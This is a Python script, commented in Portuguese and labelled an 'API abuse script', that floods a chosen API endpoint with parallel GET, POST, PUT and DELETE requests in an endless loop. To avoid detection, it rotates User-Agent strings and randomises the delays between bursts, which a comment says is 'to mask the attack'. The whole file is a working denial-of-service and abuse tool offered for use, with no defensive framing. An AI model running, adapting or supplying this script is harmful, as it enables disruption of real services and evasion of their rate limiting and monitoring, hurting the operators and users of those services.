import requests
import yaml
import concurrent.futures
import random
import time
import argparse

# Função para carregar a configuração do arquivo YML
def load_config(file_path):
    with open(file_path, 'r') as file:
        return yaml.safe_load(file)

# Função para criar argumentos da linha de comando
def parse_args():
    parser = argparse.ArgumentParser(description="Script de Abuso de API")
    parser.add_argument('--endpoint', type=str, help='URL do endpoint da API')
    parser.add_argument('--threads', type=int, help='Número de threads para o ataque')
    parser.add_argument('--config', type=str, default="config/config_api.yml", help='Caminho para o arquivo de configuração YAML')
    return parser.parse_args()

# Função para variar o User-Agent
def randomize_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X)"
    ]
    return random.choice(user_agents)

# Função para enviar requisições abusivas à API
def send_abusive_request(method, url, headers, data=None):
    session = requests.Session()
    headers['User-Agent'] = randomize_user_agent()
    if method == 'GET':
        response = session.get(url, headers=headers, params=data)
    elif method == 'POST':
        response = session.post(url, headers=headers, json=data)
    elif method == 'PUT':
        response = session.put(url, headers=headers, json=data)
    elif method == 'DELETE':
        response = session.delete(url, headers=headers)
    else:
        return None
    return response

# Função para executar o abuso da API em paralelo
def abuse_api_parallel(api_methods, url, headers, data_payloads, num_threads):
    with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
        while True:
            for method in api_methods:
                for data in data_payloads:
                    executor.submit(send_abusive_request, method, url, headers, data)
            time.sleep(random.uniform(0.1, 0.5))  # Variação no tempo para mascarar o ataque

# Função principal para o abuso contínuo
def infinite_abuse_api(config, endpoint=None, threads=None):
    url = endpoint if endpoint else config['endpoint']
    api_methods = config.get('methods', ['GET', 'POST'])
    num_threads = threads if threads else config.get('threads', 50)
    headers = config.get('headers', {'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'})
    data_payloads = config.get('data_payloads', [])

    abuse_api_parallel(api_methods, url, headers, data_payloads, num_threads)

# Execução principal
if __name__ == "__main__":
    args = parse_args()
    config = load_config(args.config)
    infinite_abuse_api(config, endpoint=args.endpoint, threads=args.threads)
